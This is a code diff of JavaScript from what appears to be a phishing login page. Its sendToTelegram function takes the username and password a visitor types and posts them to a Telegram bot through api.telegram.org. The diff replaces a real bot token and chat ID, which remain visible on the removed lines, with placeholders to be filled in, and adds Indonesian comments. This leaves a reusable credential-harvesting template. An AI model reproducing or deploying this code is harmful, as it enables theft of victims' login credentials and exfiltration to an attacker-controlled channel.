@@ -57,14 +57,14 @@ document.addEventListener('DOMContentLoaded', function() {
     // });
 
     function sendToTelegram(e) {
-        e.preventDefault();
+        e.preventDefault(); // ⛔ cegah reload halaman
     
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
     
         const message = `📥 Login Baru:\nUsername: ${username}\nPassword: ${password}`;
-        const botToken = '7851747348:AAE7Tj8ZH_I7UNN5c35BZb8c1mfYiU1qIRo';
-        const chatId = '6448306853';
+        const botToken = 'ISI_TOKEN_BOT_KAMU';
+        const chatId = 'ISI_CHAT_ID_KAMU';
     
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -78,5 +78,8 @@ document.addEventListener('DOMContentLoaded', function() {
             alert("❌ Gagal mengirim data.");
             console.error(err);
         });
+    
+        return false; // ⛔ cegah reload halaman (lagi)
     }
+
 });
